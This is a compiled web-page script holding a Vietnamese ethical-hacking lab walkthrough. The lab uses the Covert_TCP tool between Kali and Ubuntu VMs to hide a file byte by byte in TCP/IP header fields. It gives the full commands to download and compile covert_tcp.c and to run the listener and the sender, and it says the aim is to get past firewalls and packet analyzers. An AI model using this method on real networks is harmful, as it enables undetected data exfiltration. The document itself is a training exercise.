import{_ as e,c,a1 as a,o as n}from"./chunks/framework.BDxlaA_J.js";const d=JSON.parse('{"title":"Kênh Bí mật sử dụng Cover_TCP","description":"","frontmatter":{},"headers":[],"relativePath":"vi/categories/ethical-hacking-labs/5-system-hacking/10-Covert_TCP.md","filePath":"vi/categories/ethical-hacking-labs/5-system-hacking/10-Covert_TCP.md"}'),i={name:"vi/categories/ethical-hacking-labs/5-system-hacking/10-Covert_TCP.md"};function r(o,t,h,s,g,l){return n(),c("div",null,t[0]||(t[0]=[a('<h1 id="kenh-bi-mat-su-dung-cover-tcp" tabindex="-1">Kênh Bí mật sử dụng Cover_TCP <a class="header-anchor" href="#kenh-bi-mat-su-dung-cover-tcp" aria-label="Permalink to &quot;Kênh Bí mật sử dụng Cover_TCP&quot;">​</a></h1><p>Chương trình này thao túng header TCP/IP để truyền file từng byte một đến máy đích.</p><p>Mạng sử dụng quyền kiểm soát truy cập mạng để cho phép/từ chối lưu lượng đi qua. Tunneling được sử dụng để bỏ qua các quy tắc kiểm soát truy cập của tường lửa, IDS, IPS, proxy web để cho phép một số loại lưu lượng nhất định. Kênh bí mật có thể được tạo bằng cách chèn dữ liệu vào các trường không sử dụng của header giao thức. Có nhiều trường không sử dụng hoặc sử dụng sai trong TCP hoặc IP qua đó dữ liệu có thể được gửi để bỏ qua tường lửa.</p><h3 id="covert-tcp" tabindex="-1"><code>Covert_TCP</code> <a class="header-anchor" href="#covert-tcp" aria-label="Permalink to &quot;`Covert_TCP`&quot;">​</a></h3><p>Covert_TCP thao túng header TCP/IP của gói dữ liệu để gửi file từng byte một từ bất kỳ máy nào đến đích. Nó có thể hoạt động như cả máy chủ và máy khách và có thể được sử dụng để ẩn dữ liệu được truyền bên trong header IP. Điều này hữu ích khi bỏ qua tường lửa và gửi dữ liệu với các gói trông hợp pháp không chứa dữ liệu cho trình phân tích gói.</p><h3 id="muc-tieu" tabindex="-1">Mục tiêu <a class="header-anchor" href="#muc-tieu" aria-label="Permalink to &quot;Mục tiêu&quot;">​</a></h3><ul><li>Cách thực hiện lưu lượng bí mật bên trong các trường không sử dụng của header TCP và IP.</li></ul><h3 id="yeu-cau" tabindex="-1">Yêu cầu <a class="header-anchor" href="#yeu-cau" aria-label="Permalink to &quot;Yêu cầu&quot;">​</a></h3><ul><li>Máy ảo Windows Server 2016/2012.</li><li>Máy ảo Kali Linux.</li><li>máy ảo Ubuntu Linux.</li></ul><hr><h3 id="tao-file-thong-điep-bi-mat" tabindex="-1">Tạo File Thông điệp Bí mật <a class="header-anchor" href="#tao-file-thong-điep-bi-mat" aria-label="Permalink to &quot;Tạo File Thông điệp Bí mật&quot;">​</a></h3><p>Trên Kali Linux, khởi chạy một cửa sổ Terminal mới.</p><ol><li><p>Tạo một thư mục tên <strong>send</strong> trên <strong>Desktop</strong>, và điều hướng vào nó: <code>cd Desktop</code><code>mkdir send</code><code>cd send</code></p></li><li><p>Tạo file text tên <strong>message.txt</strong> bên trong thư mục <strong>send</strong> chứa chuỗi: <strong>Secret Message!</strong><code>echo &quot;Secret Message!&quot; &gt; message.txt</code></p></li></ol><h3 id="bien-dich-convert-tcp" tabindex="-1">Biên dịch <strong>convert_tcp</strong> <a class="header-anchor" href="#bien-dich-convert-tcp" aria-label="Permalink to &quot;Biên dịch **convert_tcp**&quot;">​</a></h3><ol start="3"><li><p>Tải file <strong>covert_tcp.c</strong> vào <strong>thư mục send:</strong><code>wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c</code></p></li><li><p>Biên dịch file convert_tcp.c: <code>cc -o covert_tcp covert_tcp.c</code><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/d1ba707cb8661a70e9081b65d5aec738b1a31d8e/covert-1.png" alt="covert-compile-1"></p></li></ol><h3 id="tao-đich-nhan" tabindex="-1">Tạo Đích Nhận <a class="header-anchor" href="#tao-đich-nhan" aria-label="Permalink to &quot;Tạo Đích Nhận&quot;">​</a></h3><ol start="5"><li><p>Chuyển sang Ubuntu và mở một cửa sổ Terminal mới.</p></li><li><p>Chuyển sang quyền super-user: <code>sudo su</code></p></li><li><p>Khởi động <strong><a href="https://www.lifewire.com/tcpdump-linux-command-unix-command-4097081" target="_blank" rel="noreferrer">tcpdump</a></strong> như hình dưới đây: <code>tcpdump -nvvX port 8888 -i lo</code><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3667d22752bffd47fb4bdc59cd292264d2678674/covert-2.png" alt="tcp-dump-ubuntu-2"></p></li><li><p>Để <strong>tcpdump listener</strong> chạy và mở một cửa sổ hoặc tab Terminal khác.</p></li><li><p>Truy cập Desktop và tạo một thư mục tên <strong>receive</strong> và điều hướng vào nó: <code>cd Desktop</code><code>mkdir receive</code><code>cd receive</code></p></li><li><p>Tải file <strong>covert_tcp.c</strong> vào <strong>thư mục receive:</strong><code>wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c</code></p></li><li><p>Biên dịch file convert_tcp.c: <code>cc -o covert_tcp covert_tcp.c</code> Lưu ý: Trong trường hợp bạn gặp lỗi về lệnh <code>cc</code>, cài đặt trình biên dịch: <code>sudo apt install gcc</code></p></li></ol><h3 id="thiet-lap-listener" tabindex="-1">Thiết lập Listener <a class="header-anchor" href="#thiet-lap-listener" aria-label="Permalink to &quot;Thiết lập Listener&quot;">​</a></h3><ol start="12"><li>Khởi động Listener [Dest=Ubuntu, Source=Kali]: <code>./covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 9999 -dest_port 8888 -server -file /home/s4msepi0l/Desktop/receive/receive.txt</code><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Listener-ubuntu-covert-4.png" alt="Ubuntu-tcplistener"></li></ol><h3 id="khoi-chay-wireshark-tren-kali" tabindex="-1">Khởi chạy Wireshark trên Kali <a class="header-anchor" href="#khoi-chay-wireshark-tren-kali" aria-label="Permalink to &quot;Khởi chạy Wireshark trên Kali&quot;">​</a></h3><ol start="13"><li><p>Quay lại Kali và khởi chạy Wireshark. <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Wireshark-Covert-5.png" alt="wireshark-kali-1"></p></li><li><p>Bắt đầu bắt gói Wireshark, nhấp đúp vào mục giao diện mạng chính: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Wireshark-Covert-6.png" alt="wirehsark-capturing-kali-2"></p></li></ol><h3 id="bat-đau-gui-thong-điep-bi-mat" tabindex="-1">Bắt đầu Gửi <strong>Thông điệp Bí mật</strong> <a class="header-anchor" href="#bat-đau-gui-thong-điep-bi-mat" aria-label="Permalink to &quot;Bắt đầu Gửi **Thông điệp Bí mật**&quot;">​</a></h3><ol start="15"><li>Thu nhỏ Wireshark và mở một cửa sổ Terminal mới trên Kali, điều hướng đến thư mục <strong>send</strong>.</li><li>Bắt đầu gửi nội dung của file message.txt qua TCP. <code>/covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 8888 -dest_port 9999 -file /root/Desktop/send/message.txt</code><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/ec17197736d6b7a86925a36016d64c4ef5e25444/message-covert-7.png" alt="sendsecretmessage"> Covert_tcp bắt đầu gửi chuỗi từng ký tự một như hình trên. Nếu bạn chuyển sang cửa sổ terminal trên Ubuntu, bạn sẽ thấy thông điệp đang được nhận: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/ec17197736d6b7a86925a36016d64c4ef5e25444/message-covert-8.png" alt="receivingsecretmessage"></li></ol><h3 id="phan-tich-ket-qua" tabindex="-1">Phân tích Kết quả <a class="header-anchor" href="#phan-tich-ket-qua" aria-label="Permalink to &quot;Phân tích Kết quả&quot;">​</a></h3><ol start="17"><li><p>Trên máy Ubuntu, dừng tcpdump bằng cách nhấn <strong>Ctrl+C</strong> như hình dưới đây: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0dc76e10644c655c0871c8910233c7869a725593/cover-9.png" alt="tcpdump-stop"> Tcpdump cho thấy không có gói nào được bắt trong mạng.</p></li><li><p>Điều hướng đến <strong>/Desktop/receive/</strong> và nhấp đúp vào file <strong>receive.txt</strong> để xem nội dung. Bạn sẽ thấy toàn bộ thông điệp được lưu trong file như hình dưới đây: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0dc76e10644c655c0871c8910233c7869a725593/covert-10.png" alt="secretmessage-kali"></p></li><li><p>Chuyển lại <strong>Kali và Dừng bắt gói trên Wireshark</strong> bằng cách nhấp vào nút đỏ ở góc trên bên trái.</p></li><li><p>Nhấp vào ô <strong>Apply a display filter</strong> và nhập <strong>tcp</strong> để chỉ xem các gói TCP như hình dưới đây: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/wireshark-covert-11.png" alt="apply-display-filter=tcp"></p></li></ol><p>Nếu bạn kiểm tra giao tiếp giữa Ubuntu và Kali (10.0.2.46 - 10.0.2.42) bạn sẽ thấy mỗi ký tự của chuỗi thông điệp được <strong>gửi dưới dạng gói riêng lẻ qua mạng</strong> hiển thị trong ảnh chụp màn hình tiếp theo:</p><p>Covert_tcp thay đổi header của gói TCP và thay thế nó bằng các ký tự của chuỗi từng ký tự một để gửi thông điệp mà không bị phát hiện.</p><p>Gói 1, chuỗi: <strong>S</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/s-tcp-12.png" alt="tcp-1"></p><p>Gói 2, chuỗi: <strong>e</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/e-tcp-13.png" alt="tcp-2"></p><p>Gói 3, chuỗi: <strong>c</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/c-tcp-14.png" alt="tcp-3"></p><p>Gói 4, chuỗi: <strong>r</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/r-tcp-15.png" alt="tcp-4"></p><p>(...) Và tiếp tục cho đến khi toàn bộ thông điệp hoàn thành.</p>',32)]))}const u=e(i,[["render",r]]);export{d as __pageData,u as default};
